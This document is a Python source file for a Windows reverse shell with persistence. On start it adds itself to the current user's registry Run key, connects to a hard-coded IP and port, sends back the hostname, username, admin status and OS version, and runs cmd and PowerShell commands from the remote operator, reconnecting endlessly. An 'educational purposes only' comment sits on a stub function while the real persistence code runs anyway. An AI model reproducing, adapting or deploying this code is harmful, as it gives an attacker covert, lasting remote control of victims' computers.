import socket
import subprocess
import os
import sys
import platform
import ctypes
import winreg
import time
key = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    r"Software\Microsoft\Windows\CurrentVersion\Run",
    0,
    winreg.KEY_SET_VALUE
)
winreg.SetValueEx(
    key,                    # Registry key
    "MyProgram",            # Name of the startup entry
    0,                      # Reserved (must be 0)
    winreg.REG_SZ,          # Type of value (string)
    sys.executable          # Path to this program
)
winreg.CloseKey(key)
#print("Program added to Windows startup!")
#input("Press Enter to close...")
def is_admin():
    """Check if running as administrator"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def windows_reverse_shell(host, port):
    """Windows-specific reverse shell implementation"""
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Send Windows info
        s.send(f"[*] Connected from {socket.gethostname()}\n".encode())
        s.send(f"[*] User: {os.getenv('USERNAME')}\n".encode())
        s.send(f"[*] Admin: {is_admin()}\n".encode())
        s.send(f"[*] Windows Version: {platform.version()}\n\n".encode())
        
        # Change to current user's directory
        os.chdir(os.path.expanduser("~"))
        
        while True:
            # Windows-style prompt
            current_dir = os.getcwd()
            prompt = f"\n{os.getenv('USERNAME')}@{socket.gethostname()} {current_dir}> "
            s.send(prompt.encode())
            
            # Receive command
            data = s.recv(4096).decode('utf-8', errors='ignore').strip()
            
            if not data:
                continue
                
            # Exit commands
            if data.lower() in ["exit", "quit"]:
                s.send(b"[*] Closing connection\n")
                break
            
            # Special Windows commands
            if data.lower() == "whoami":
                result = f"{os.getenv('USERNAME')}\n"
                s.send(result.encode())
                continue
                
            elif data.lower() == "sysinfo":
                info = f"""
System Information:
- Computer: {platform.node()}
- User: {os.getenv('USERNAME')}
- OS: {platform.system()} {platform.release()}
- Version: {platform.version()}
- Architecture: {platform.machine()}
- Processor: {platform.processor()}
- Admin: {is_admin()}
                """
                s.send(info.encode())
                continue
            
            elif data.startswith("cd "):
                # Handle directory change
                try:
                    new_dir = data[3:].strip()
                    # Handle special paths
                    if new_dir == "~" or new_dir == "%userprofile%":
                        new_dir = os.path.expanduser("~")
                    elif new_dir.startswith("%") and new_dir.endswith("%"):
                        # Windows environment variable
                        var_name = new_dir[1:-1]
                        new_dir = os.getenv(var_name, new_dir)
                    
                    os.chdir(new_dir)
                    s.send(f"Changed to {os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"Error: {str(e)}\n".encode())
                continue
            
            # Execute command with Windows-specific settings
            try:
                # Use Windows cmd.exe for better compatibility
                if data.lower().startswith("powershell"):
                    # PowerShell command
                    cmd = ["powershell", "-Command", data[10:]]
                    use_shell = False
                elif data.lower().startswith("cmd "):
                    # Explicit cmd command
                    cmd = data[4:]
                    use_shell = True
                else:
                    # Regular command
                    cmd = data
                    use_shell = True
                
                # Execute command
                result = subprocess.run(
                    cmd if use_shell else ["cmd", "/c"] + cmd,
                    shell=use_shell,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    cwd=os.getcwd()
                )
                
                # Combine stdout and stderr
                output = result.stdout
                if result.stderr:
                    output += f"\n[stderr]\n{result.stderr}"
                
                if not output:
                    output = "[*] Command executed successfully\n"
                    
                s.send(output.encode())
                
            except subprocess.TimeoutExpired:
                s.send(b"[!] Command timed out after 30 seconds\n")
            except Exception as e:
                s.send(f"[!] Error: {str(e)}\n".encode())
                
    except KeyboardInterrupt:
        s.send(b"\n[*] Interrupted by user\n")
    except Exception as e:
        pass
    finally:
        try:
            s.close()
        except:
            pass

def create_windows_persistence():
    """Example: Create persistence via registry (for educational purposes only)"""
    if is_admin():
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
                # This would add to startup - NOT RECOMMENDED for real use
                # winreg.SetValueEx(reg_key, "MyApp", 0, winreg.REG_SZ, sys.executable + " " + sys.argv[0])
                pass
            return "[*] Persistence could be added (demo only)"
        except:
            return "[!] Could not access registry"
    else:
        return "[!] Not running as admin"

if __name__ == "__main__":

    print("=" * 40)
    
    # Default connection parameters
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        # Interactive mode
        HOST ="192.168.1.5" #replace according to your need
        PORT =4444 #replace according to your need
    while True:
        try:
            windows_reverse_shell(HOST,PORT)
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
        except Exception as e:
            print(f"[!] Error: {e}")
        
